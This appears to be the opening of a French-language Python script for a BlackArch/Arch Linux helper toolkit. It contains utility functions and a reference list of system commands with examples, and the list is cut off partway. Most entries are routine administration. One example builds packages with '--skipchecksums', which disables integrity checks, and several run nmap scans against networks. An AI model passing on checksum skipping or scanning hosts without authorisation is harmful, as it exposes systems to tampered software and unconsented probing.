#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BlackArch Toolkit 2026.7 - Shadow Protocol
Auteur: hackerstchad
"""

import os
import sys
import json
import time
import shutil
import random
import string
import argparse
import logging
import hashlib
import subprocess
import ipaddress
import platform
import textwrap
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Tuple, Optional, Any

VERSION = "2026.7"
CODENAME = "Shadow Protocol"
AUTHOR = "hackerstchad"
EMAIL = "hackerstchad@protonmail.com"
REPO = "https://github.com/hackerstchad/blackarch-toolkit"
RELEASE_YEAR = "2026-2027"
LOG_FILE = "/tmp/blackarch_toolkit.log"
CONFIG_DIR = Path.home() / ".config" / "blackarch_toolkit"
CONFIG_FILE = CONFIG_DIR / "config.json"
HISTORY_FILE = CONFIG_DIR / "history.json"

R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
M = "\033[95m"
C = "\033[96m"
D = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"

ASCII_BANNER = f"""
{C}{BOLD}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@%:@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@%  #@@#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@. . %@@#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#%@% ... %@%#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#@@@  .... %@@#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@%@  ...... @@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@  ........ @@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#@%  ......... :@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%. .............@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#@@* ..............%@%#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#@@%  .............. %@@#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#@@%% .................@%@#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#@@@%%@=................ @@@#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#@@@    @%%............... @@@#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#@@%  ...   +%. ............ %@@#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#%@@  .......   .............. @%@#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#@@%  .......................... %@@#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#@@@  ............................ %@@#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#@@@  .............................. %@@#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@%  ................................ %@%#%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@%  .................................. =@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@*  .....................................%@%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%@@=  ...................................... #@@%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%@%: ................%@@@@@@@*................ +%@%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%@@@   ..............#%@%#%%%%@@%................ :@@%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%@@@  ...............%@@%%%%%%%%@@@*.................@%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%@@  ................@@#%%%%%%%%%@@@................. @@@%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%#%@%  ................%@@%%%%%%%%%%#@@@................. @@@%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%#@@@  .................@@#%%%%%%%%%%%%%@............@.. .. @@@%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%#@@@  ..................@@#%%%%%%%%%%%%%@ ..........    @%@. %@%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%#@%%  ...................@@#%%%%%%%%%%%%@@ ..............   @@@@%#%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%#@@@  ....................@@%%%%%%%%%%%%@@@ .................  =@@@@#%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%@@%  .................:%@@@%%%%%%%%%%%%%%@@@@#.................   %@@#%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%@@*  ............=%%@@@@%@%#%%%%%%%%%%%%%%%#%@%@@@@@@.............. %@@#%%%%%%%%%%%%%
%%%%%%%%%%%%%@@@.  ........:@@@@@%%#%%%%%%%%%%%%%%%%%%%%%%%%%%%%##%@@%@@@.......... %@@#%%%%%%%%%%%%
%%%%%%%%%%%%@@@.  ......@%@@@@#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#%@@@@@%....... @@%#%%%%%%%%%%%
%%%%%%%%%%%@%@  ...=@@@@@%#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#%@@@@%.... #@%%%%%%%%%%%%
%%%%%%%%%%@@%  .%@@@%%#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#@@@@@%. =@@%%%%%%%%%%
%%%%%%%%%#@%%@@%@%#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#%@@@%:@@%%%%%%%%%
%%%%%%%%%%%%@@#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#%@@@#%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 
{D}
{B}Advanced BlackArch Linux Arsenal & Arch Linux Encyclopedia{Y}  v{VERSION}{D}
{BOLD}{M}Auteur: {AUTHOR} | {EMAIL} | {REPO}{D}
"""


def setup_logging(level: int = logging.INFO) -> logging.Logger:
    logging.basicConfig(
        filename=LOG_FILE,
        filemode="a",
        format="%(asctime)s | %(levelname)s | %(message)s",
        level=level,
    )
    console = logging.StreamHandler(sys.stdout)
    console.setLevel(logging.WARNING)
    formatter = logging.Formatter("%(levelname)s: %(message)s")
    console.setFormatter(formatter)
    logger = logging.getLogger("blackarch_toolkit")
    logger.addHandler(console)
    return logger


logger = setup_logging()


def print_banner():
    os.system("clear" if os.name != "nt" else "cls")
    print(ASCII_BANNER)
    print(f"{Y}Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{D}")
    print(f"{Y}OS: {platform.system()} {platform.release()} | Python: {platform.python_version()}{D}\n")


def section(title: str):
    print(f"\n{C}{BOLD}{'─' * 70}{D}")
    print(f"{C}{BOLD}  ▶ {title}{D}")
    print(f"{C}{BOLD}{'─' * 70}{D}\n")


def success(msg: str):
    print(f"{G}[✔] {msg}{D}")
    logger.info(msg)


def info(msg: str):
    print(f"{B}[ℹ] {msg}{D}")
    logger.info(msg)


def warning(msg: str):
    print(f"{Y}[⚠] {msg}{D}")
    logger.warning(msg)


def error(msg: str):
    print(f"{R}[✘] {msg}{D}")
    logger.error(msg)


def pause():
    input(f"\n{DIM}Appuie sur ENTREE pour continuer...{D}")


def spinner(seconds: int, text: str = "Chargement"):
    frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    end = time.time() + seconds
    i = 0
    while time.time() < end:
        print(f"\r{C}{frames[i % len(frames)]}{D} {text}...", end="", flush=True)
        time.sleep(0.08)
        i += 1
    print(f"\r{G}✔{D} {text} terminé{' ' * 20}")


def generate_id(length: int = 12) -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))


def sha256sum(path: Path) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            h.update(chunk)
    return h.hexdigest()


def require_root() -> bool:
    return os.geteuid() == 0 if os.name != "nt" else False


def safe_input(prompt: str = "") -> str:
    try:
        return input(prompt)
    except (EOFError, KeyboardInterrupt):
        return ""


def load_config() -> Dict[str, Any]:
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    if CONFIG_FILE.exists():
        try:
            return json.loads(CONFIG_FILE.read_text(encoding="utf-8"))
        except json.JSONDecodeError:
            warning("Fichier de configuration corrompu, réinitialisation.")
    return {
        "mirror": "https://blackarch.org/strap.sh",
        "default_shell": "zsh",
        "editor": "nano",
        "theme": "dark",
        "autoupdate": True,
        "user": str(Path.home()),
        "log_level": "INFO",
        "pacman_cache": "/var/cache/pacman/pkg",
    }


def save_config(cfg: Dict[str, Any]):
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    CONFIG_FILE.write_text(json.dumps(cfg, indent=4, ensure_ascii=False), encoding="utf-8")


def load_history() -> List[Dict[str, Any]]:
    if HISTORY_FILE.exists():
        try:
            return json.loads(HISTORY_FILE.read_text(encoding="utf-8"))
        except json.JSONDecodeError:
            return []
    return []


def append_history(entry: Dict[str, Any]):
    history = load_history()
    entry["timestamp"] = datetime.now().isoformat()
    entry["id"] = generate_id()
    history.append(entry)
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    HISTORY_FILE.write_text(json.dumps(history[-500:], indent=2, ensure_ascii=False), encoding="utf-8")


def run(cmd: List[str], shell: bool = False, capture: bool = False, check: bool = False) -> Tuple[int, str, str]:
    logger.debug(f"run: {' '.join(cmd) if isinstance(cmd, list) else cmd}")
    try:
        if capture:
            result = subprocess.run(cmd, shell=shell, capture_output=True, text=True, check=check)
            return result.returncode, result.stdout, result.stderr
        returncode = subprocess.call(cmd, shell=shell)
        return returncode, "", ""
    except FileNotFoundError as exc:
        error(f"Commande introuvable: {cmd}")
        return 127, "", str(exc)
    except subprocess.CalledProcessError as exc:
        return exc.returncode, exc.stdout or "", exc.stderr or ""
    except Exception as exc:
        error(f"Erreur d'exécution: {exc}")
        return 1, "", str(exc)


def run_pacman(args: List[str], capture: bool = False) -> Tuple[int, str, str]:
    return run(["pacman"] + args, capture=capture)


def run_yay(args: List[str], capture: bool = False) -> Tuple[int, str, str]:
    if shutil.which("yay"):
        return run(["yay"] + args, capture=capture)
    warning("yay n'est pas installé. Tentative avec paru...")
    if shutil.which("paru"):
        return run(["paru"] + args, capture=capture)
    error("Aucun AUR helper (yay/paru) trouvé.")
    return 127, "", "AUR helper introuvable"


def confirm(question: str) -> bool:
    answer = safe_input(f"{Y}{question} [O/n]: {D}").strip().lower()
    return answer in ("o", "", "oui", "y", "yes")


ARCH_COMMANDS: List[Dict[str, Any]] = [
    {"category": "Gestion des paquets", "command": "pacman -Syu", "description": "Synchronise les dépôts et met à jour tous les paquets installés.", "syntaxe": "pacman -Syu", "exemples": ["sudo pacman -Syu", "sudo pacman -Syu --noconfirm"]},
    {"category": "Gestion des paquets", "command": "pacman -S", "description": "Installe un ou plusieurs paquets depuis les dépôts officiels.", "syntaxe": "pacman -S <paquet1> [paquet2] ...", "exemples": ["sudo pacman -S nmap", "sudo pacman -S vim git curl"]},
    {"category": "Gestion des paquets", "command": "pacman -R", "description": "Supprime un paquet sans toucher à ses dépendances.", "syntaxe": "pacman -R <paquet>", "exemples": ["sudo pacman -R nmap"]},
    {"category": "Gestion des paquets", "command": "pacman -Rs", "description": "Supprime un paquet et ses dépendances non requises par ailleurs.", "syntaxe": "pacman -Rs <paquet>", "exemples": ["sudo pacman -Rs nmap"]},
    {"category": "Gestion des paquets", "command": "pacman -Rns", "description": "Supprime un paquet, ses dépendances et les fichiers de configuration.", "syntaxe": "pacman -Rns <paquet>", "exemples": ["sudo pacman -Rns nmap"]},
    {"category": "Gestion des paquets", "command": "pacman -Ss", "description": "Recherche un paquet dans les dépôts synchronisés.", "syntaxe": "pacman -Ss <terme>", "exemples": ["pacman -Ss nmap", "pacman -Ss 'network scanner'"]},
    {"category": "Gestion des paquets", "command": "pacman -Si", "description": "Affiche les informations détaillées d'un paquet dans les dépôts.", "syntaxe": "pacman -Si <paquet>", "exemples": ["pacman -Si nmap"]},
    {"category": "Gestion des paquets", "command": "pacman -Qi", "description": "Affiche les informations d'un paquet installé localement.", "syntaxe": "pacman -Qi <paquet>", "exemples": ["pacman -Qi nmap"]},
    {"category": "Gestion des paquets", "command": "pacman -Ql", "description": "Liste tous les fichiers installés par un paquet.", "syntaxe": "pacman -Ql <paquet>", "exemples": ["pacman -Ql nmap"]},
    {"category": "Gestion des paquets", "command": "pacman -Qo", "description": "Identifie le paquet propriétaire d'un fichier donné.", "syntaxe": "pacman -Qo <chemin/fichier>", "exemples": ["pacman -Qo /usr/bin/nmap"]},
    {"category": "Gestion des paquets", "command": "pacman -Qdt", "description": "Liste les dépendances orphelines (non requises par aucun paquet).", "syntaxe": "pacman -Qdt", "exemples": ["pacman -Qdt", "sudo pacman -Rns $(pacman -Qdtq)"]},
    {"category": "Gestion des paquets", "command": "pacman -Sc", "description": "Nettoie le cache pacman en supprimant les anciens paquets.", "syntaxe": "pacman -Sc", "exemples": ["sudo pacman -Sc"]},
    {"category": "Gestion des paquets", "command": "pacman -Scc", "description": "Vide complètement le cache pacman (attention, irréversible).", "syntaxe": "pacman -Scc", "exemples": ["sudo pacman -Scc"]},
    {"category": "Gestion des paquets", "command": "pacman -U", "description": "Installe un paquet local (.pkg.tar.zst) ou depuis une URL.", "syntaxe": "pacman -U <fichier>", "exemples": ["sudo pacman -U ./nmap-1.0-1-x86_64.pkg.tar.zst"]},
    {"category": "Gestion des paquets", "command": "pacman -F", "description": "Recherche quel paquet fournit un fichier spécifique (nécessite -Fy).", "syntaxe": "pacman -F <fichier>", "exemples": ["sudo pacman -Fy", "pacman -F /usr/bin/nmap", "pacman -F nmap"]},
    {"category": "Gestion des paquets", "command": "pacman-key", "description": "Gère les clés GPG utilisées pour signer les paquets.", "syntaxe": "pacman-key --init | --populate", "exemples": ["sudo pacman-key --init", "sudo pacman-key --populate archlinux"]},
    {"category": "Gestion des paquets", "command": "makepkg", "description": "Compile un paquet depuis un PKGBUILD.", "syntaxe": "makepkg -si", "exemples": ["makepkg -si", "makepkg -si --skipchecksums"]},
    {"category": "Gestion des paquets", "command": "makepkg -si", "description": "Compile et installe un paquet AUR depuis son dossier source.", "syntaxe": "makepkg -si", "exemples": ["cd /tmp/pkg && makepkg -si"]},
    {"category": "Gestion des paquets", "command": "pkgfile", "description": "Recherche le paquet fournissant un fichier dans les dépôts.", "syntaxe": "pkgfile <fichier>", "exemples": ["pkgfile nmap", "pkgfile -u"]},
    {"category": "Gestion des paquets", "command": "checkupdates", "description": "Liste les mises à jour disponibles sans modifier le système.", "syntaxe": "checkupdates", "exemples": ["checkupdates", "checkupdates --download"]},
    {"category": "Système & Boot", "command": "systemctl", "description": "Contrôle les services systemd: démarrer, arrêter, activer, status.", "syntaxe": "systemctl <action> <service>", "exemples": ["sudo systemctl start sshd", "sudo systemctl enable sshd", "systemctl status sshd", "sudo systemctl reboot"]},
    {"category": "Système & Boot", "command": "journalctl", "description": "Consulte les journaux système de systemd.", "syntaxe": "journalctl [options]", "exemples": ["journalctl -xe", "journalctl -u sshd", "journalctl --since '1 hour ago'"]},
    {"category": "Système & Boot", "command": "mkinitcpio", "description": "Génère l'initramfs utilisé au démarrage.", "syntaxe": "mkinitcpio -P", "exemples": ["sudo mkinitcpio -P", "sudo mkinitcpio -p linux"]},
    {"category": "Système & Boot", "command": "grub-mkconfig", "description": "Regénère le fichier de configuration GRUB.", "syntaxe": "grub-mkconfig -o /boot/grub/grub.cfg", "exemples": ["sudo grub-mkconfig -o /boot/grub/grub.cfg"]},
    {"category": "Système & Boot", "command": "arch-chroot", "description": "Change la racine temporaire, utile pour réparer un système Arch.", "syntaxe": "arch-chroot /mnt", "exemples": ["sudo arch-chroot /mnt", "sudo arch-chroot /mnt /bin/bash"]},
    {"category": "Système & Boot", "command": "timedatectl", "description": "Configure la date, l'heure et le fuseau horaire.", "syntaxe": "timedatectl [commande]", "exemples": ["timedatectl status", "sudo timedatectl set-timezone Europe/Paris", "sudo timedatectl set-ntp true"]},
    {"category": "Système & Boot", "command": "hostnamectl", "description": "Affiche ou modifie le hostname du système.", "syntaxe": "hostnamectl [set-hostname <nom>]", "exemples": ["hostnamectl", "sudo hostnamectl set-hostname blackarch"]},
    {"category": "Système & Boot", "command": "locale-gen", "description": "Génère les locales définies dans /etc/locale.gen.", "syntaxe": "locale-gen", "exemples": ["sudo locale-gen"]},
    {"category": "Système & Boot", "command": "localectl", "description": "Configure la disposition du clavier et la locale système.", "syntaxe": "localectl [commande]", "exemples": ["localectl status", "sudo localectl set-keymap fr"]},
    {"category": "Réseau", "command": "ip", "description": "Outil moderne de configuration réseau (remplace ifconfig).", "syntaxe": "ip [object] [commande]", "exemples": ["ip addr show", "ip link set eth0 up", "ip route show", "sudo ip addr add 192.168.1.10/24 dev eth0"]},
    {"category": "Réseau", "command": "ss", "description": "Investigation des sockets (remplace netstat).", "syntaxe": "ss [options]", "exemples": ["ss -tulnp", "ss -s", "ss -tn state established"]},
    {"category": "Réseau", "command": "ping", "description": "Teste la connectivité vers une cible avec des paquets ICMP.", "syntaxe": "ping [options] <hôte>", "exemples": ["ping -c 4 8.8.8.8", "ping -c 4 archlinux.org"]},
    {"category": "Réseau", "command": "traceroute", "description": "Affiche la route empruntée par les paquets jusqu'à la cible.", "syntaxe": "traceroute <hôte>", "exemples": ["traceroute 8.8.8.8", "traceroute -I archlinux.org"]},
    {"category": "Réseau", "command": "curl", "description": "Transfère des données depuis/vers un serveur via divers protocoles.", "syntaxe": "curl [options] <URL>", "exemples": ["curl -O https://example.com/file.tar.gz", "curl -I https://archlinux.org", "curl -d 'data' -X POST https://api.example.com"]},
    {"category": "Réseau", "command": "wget", "description": "Télécharge des fichiers depuis le web.", "syntaxe": "wget [options] <URL>", "exemples": ["wget https://example.com/file.iso", "wget -c https://example.com/file.iso", "wget --mirror -p --convert-links https://site.com"]},
    {"category": "Réseau", "command": "nmap", "description": "Scanner de ports et d'hôtes réseau.", "syntaxe": "nmap [options] <cible>", "exemples": ["nmap -sV 192.168.1.1", "nmap -A 192.168.1.0/24", "nmap -p- target.com"]},
    {"category": "Réseau", "command": "iw", "description": "Configuration des interfaces Wi-Fi modernes.", "syntaxe": "iw [options] [commande]", "exemples": ["iw dev", "iw dev wlan0 scan", "iw dev wlan0 connect 'SSID'"]},
    {"category": "Réseau", "command": "nmcli", "description": "Interface en ligne de commande pour NetworkManager.", "syntaxe": "nmcli [options] [commande]", "exemples": ["nmcli device status", "nmcli connection show", "nmcli dev wifi list", "nmcli con up 'MaConnexion'"]},
    {"category": "Utilisateurs & Permissions", "command": "useradd", "description": "Crée un nouvel utilisateur.", "syntaxe": "useradd [options] <nom>", "exemples": ["sudo useradd -m -s /bin/bash alice", "sudo useradd -m -G wheel alice"]},
    {"category": "Utilisateurs & Permissions", "command": "usermod", "description": "Modifie un compte utilisateur existant.", "syntaxe": "usermod [options] <nom>", "exemples": ["sudo usermod -aG docker alice", "sudo usermod -L alice"]},
    {"category": "Utilisateurs & Permissions", "command": "passwd", "description": "Change le mot de passe d'un utilisateur.", "syntaxe": "passwd [utilisateur]", "exemples": ["passwd", "sudo passwd alice"]},
    {"category": "Utilisateurs & Permissions", "command": "chmod", "description": "Modifie les permissions d'un fichier ou dossier.", "syntaxe": "chmod [mode] <fichier>", "exemples": ["chmod +x script.sh", "chmod 755 dossier/", "chmod 600 ~/.ssh/id_rsa"]},
    {"category": "Utilisateurs & Permissions", "command": "chown", "description": "Change le propriétaire et/ou groupe d'un fichier.", "syntaxe": "chown [utilisateur][:groupe] <fichier>", "exemples": ["sudo chown alice:alice fichier.txt", "sudo chown -R alice: ~alice"]},
    {"category": "Utilisateurs & Permissions", "command": "sudo", "description": "Exécute une commande avec les privilèges d'un autre utilisateur (root par défaut).", "syntaxe": "sudo <commande>", "exemples": ["sudo pacman -Syu", "sudo -u alice commande"]},
    {"category": "Utilisateurs & Permissions", "command": "visudo", "description": "Édite le fichier sudoers de manière sécurisée.", "syntaxe": "visudo", "exemples": ["sudo EDITOR=nano visudo", "sudo visudo -c"]},
    {"category": "Disques & Fichiers", "command": "fdisk", "description": "Gestion des tables de partitions.", "syntaxe": "fdisk [options] <périphérique>", "exemples": ["sudo fdisk -l", "sudo fdisk /dev/sda"]},
    {"category": "Disques & Fichiers", "command": "lsblk", "description": "Affiche les périphériques de stockage sous forme d'arbre.", "syntaxe": "lsblk [options]", "exemples": ["lsblk", "lsblk -f", "lsblk -o NAME,SIZE,FSTYPE,MOUNTPOINT"]},
    {"category": "Disques & Fichiers", "command": "mkfs", "description": "Crée un système de fichiers sur une partition.", "syntaxe": "mkfs -t <type> <périphérique>", "exemples": ["sudo mkfs.ext4 /dev/sda1", "sudo mkfs.vfat /dev/sdb1"]},
    {"category": "Disques & Fichiers", "command": "mount", "description": "Monte un système de fichiers dans l'arborescence.", "syntaxe": "mount [périphérique] [point_de_montage]", "exemples": ["sudo mount /dev/sdb1 /mnt", "mount | grep /home"]},
    {"category": "Disques & Fichiers", "command": "umount", "description": "Démonte un système de fichiers.", "syntaxe": "umount <point_de_montage ou périphérique>", "exemples": ["sudo umount /mnt", "sudo umount /dev/sdb1"]},
    {"category": "Disques & Fichiers", "command": "df", "description": "Affiche l'espace disque utilisé et disponible.", "syntaxe": "df [options]", "exemples": ["df -h", "df -T", "df -h /home"]},
    {"category": "Disques & Fichiers", "command": "du", "description": "Estime l'utilisation de l'espace par fichiers et dossiers.", "syntaxe": "du [options] [chemin]", "exemples": ["du -sh /home", "du -h --max-depth=1 /var/log"]},
    {"category": "Disques & Fichiers", "command": "tar", "description": "Archive et compresse des fichiers.", "syntaxe": "tar [options] [archive] [fichiers]", "exemples": ["tar -czvf archive.tar.gz dossier/", "tar -xzvf archive.tar.gz", "tar -tvf archive.tar.gz"]},
    {"category": "Surveillance", "command": "top", "description": "Affiche les processus et l'utilisation des ressources en temps réel.", "syntaxe": "top", "exemples": ["top", "top -u alice"]},
    {"category": "Surveillance", "command": "htop", "description": "Visionneuse de processus interactive améliorée.", "syntaxe": "htop", "exemples": ["htop", "htop -u alice"]},
    {"category": "Surveillance", "command": "ps", "description": "Affiche un instantané des processus en cours.", "syntaxe": "ps [options]", "exemples": ["ps aux", "ps -ef", "ps -u alice"]},
    {"category": "Surveillance", "command": "kill", "description": "Envoie un signal à un processus.", "syntaxe": "kill [signal] <PID>", "exemples": ["kill 1234", "kill -9 1234", "kill -HUP 1234"]},
    {"category": "Surveillance", "command": "killall", "description": "Tue les processus par nom.", "syntaxe": "killall [options] <nom>", "exemples": ["killall firefox", "sudo killall -9 processus"]},
    {"category": "Surveillance", "command": "free", "description": "Affiche l'utilisation de la mémoire.", "syntaxe": "free [options]", "exemples": ["free -h", "free -m"]},
    {"category": "Surveillance", "command": "uptime", "description": "Indique depuis combien de temps le système tourne et la charge moyenne.", "syntaxe": "uptime", "exemples": ["uptime"]},
    {"category": "Surveillance", "command": "vmstat", "description": "Rapport sur la mémoire virtuelle, le processeur, les E/S.", "syntaxe": "vmstat [délai] [nombre]", "exemples": ["vmstat 1 5", "vmstat -s"]},
    {"category": "Surveillance", "command": "iostat", "description": "Statistiques sur l'utilisation du CPU et des disques.", "syntaxe": "iostat [options]", "exemples": ["iostat -x 1", "iostat -d"]},
    {"category": "Fichiers & Texte", "command": "ls", "description": "Liste le contenu d'un répertoire.", "syntaxe": "ls [options] [chemin]", "exemples": ["ls -la", "ls -lh /var/log", "ls --color=auto"]},
    {"category": "Fichiers & Texte", "command": "find", "description": "Recherche des fichiers selon divers critères.", "syntaxe": "find [chemin] [expression]", "exemples": ["find / -name '*.log'", "find . -type f -mtime -7", "find /tmp -type f -empty -delete"]},
    {"category": "Fichiers & Texte", "command": "grep", "description": "Recherche de motifs dans du texte.", "syntaxe": "grep [options] <motif> [fichier]", "exemples": ["grep error /var/log/syslog", "grep -r 'TODO' .", "grep -i 'failed' auth.log"]},
    {"category": "Fichiers & Texte", "command": "awk", "description": "Langage de traitement de texte et d'extraction de colonnes.", "syntaxe": "awk '<programme>' [fichier]", "exemples": ["awk '{print $1}' fichier.txt", "awk -F: '{print $1}' /etc/passwd", "df -h | awk 'NR>1 {print $5}'"]},
    {"category": "Fichiers & Texte", "command": "sed", "description": "Éditeur de flux pour transformations de texte.", "syntaxe": "sed [options] 'script' [fichier]", "exemples": ["sed 's/ancien/nouveau/g' fichier.txt", "sed -i 's/foo/bar/g' fichier.txt", "sed -n '10,20p' fichier.txt"]},
    {"category": "Fichiers & Texte", "command": "cat", "description": "Concatène et affiche le contenu de fichiers.", "syntaxe": "cat [fichier]", "exemples": ["cat /etc/os-release", "cat fichier1 fichier2 > fichier3"]},
    {"category": "Fichiers & Texte", "command": "less", "description": "Permet de lire des fichiers longs de façon paginée.", "syntaxe": "less [fichier]", "exemples": ["less /var/log/syslog", "dmesg | less"]},
    {"category": "Fichiers & Texte", "command": "rsync", "description": "Synchronisation rapide et incrémentale de fichiers.", "syntaxe": "rsync [options] source destination", "exemples": ["rsync -avz /src/ /dest/", "rsync -avz -e ssh /src/ user@host:/dest/"]},
    {"category": "Sécurité & Crypto", "command": "gpg", "description": "Outil de chiffrement et de signature GnuPG.", "syntaxe": "gpg [options] [commande]", "exemples": ["gpg --full-generate-key", "gpg -e -r alice@example.com fichier.txt", "gpg -d fichier.txt.gpg"]},
    {"category": "Sécurité & Crypto", "command": "openssl", "description": "Boîte à outils cryptographiques TLS/SSL.", "syntaxe": "openssl [commande] [options]", "exemples": ["openssl genrsa -out key.pem 4096", "openssl req -new -x509 -key key.pem -out cert.pem", "openssl s_client -connect host:443"]},
